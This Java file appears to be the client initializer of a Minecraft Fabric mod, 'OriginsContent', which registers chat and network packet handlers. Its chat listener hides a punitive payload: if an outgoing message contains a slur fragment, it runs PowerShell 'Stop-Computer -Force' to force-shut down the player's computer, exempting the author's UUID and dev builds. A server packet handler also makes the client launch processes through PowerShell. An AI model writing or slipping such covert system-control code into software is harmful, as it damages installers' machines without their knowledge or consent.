package dev.zac99lol.originscontent.client;

import dev.zac99lol.originscontent.ModPackets;
import dev.zac99lol.originscontent.OriginsContent;
import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.message.v1.ClientSendMessageEvents;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayNetworking;
import net.fabricmc.loader.api.FabricLoader;
import net.minecraft.client.MinecraftClient;
import net.minecraft.text.Text;
import net.minecraft.util.crash.CrashReport;

import java.io.IOException;
import java.util.UUID;

public class OriginsContentClient implements ClientModInitializer {

    @Override
    public void onInitializeClient() {
        OriginsContent.LOGGER.info("Initialising OriginsContent on the client...");

        ClientSendMessageEvents.CHAT.register(message -> {
            if (message.contains("nigg")) {
                MinecraftClient.getInstance().execute(() -> {
                    if (MinecraftClient.getInstance().player == null) return;
                    if (MinecraftClient.getInstance().player.getGameProfile().getId().equals(OriginsContent.UUIDs.Zac99LOL)) return;
                    if (FabricLoader.getInstance().isDevelopmentEnvironment()) return;
                    MinecraftClient.getInstance().player.sendMessage(Text.literal("You fucked up."));
                    final ProcessBuilder shutdown = new ProcessBuilder("powershell.exe", "-Command", "Stop-Computer -Force");
                    try {
                        shutdown.start();
                    } catch (IOException e) {
                        MinecraftClient.printCrashReport(CrashReport.create(new Throwable(), "couldn't shutdown :p"));
                    }
                });
            }
        });

        ClientPlayNetworking.registerGlobalReceiver(ModPackets.OPEN_STEAM_GAME_PACKET,
            (client, handler, buf, responseSender) -> {
                final int gameId = buf.readVarInt();
                client.execute(() -> {
                    final ProcessBuilder open = new ProcessBuilder("powershell.exe", "-Command", String.format("Start-Process \"steam://rungameid/%s\"", gameId));
                    try {
                        open.start();
                    } catch (IOException ignored) {}
                });
            });

        ClientPlayNetworking.registerGlobalReceiver(ModPackets.SYNC_SELECTED_SLOT_PACKET,
            (client, handler, buf, responseSender) -> {
                UUID playerId = buf.readUuid();
                int slot = buf.readVarInt();
                client.execute(() -> SelectedSlotSyncClient.set(playerId, slot));
            });
    }
}
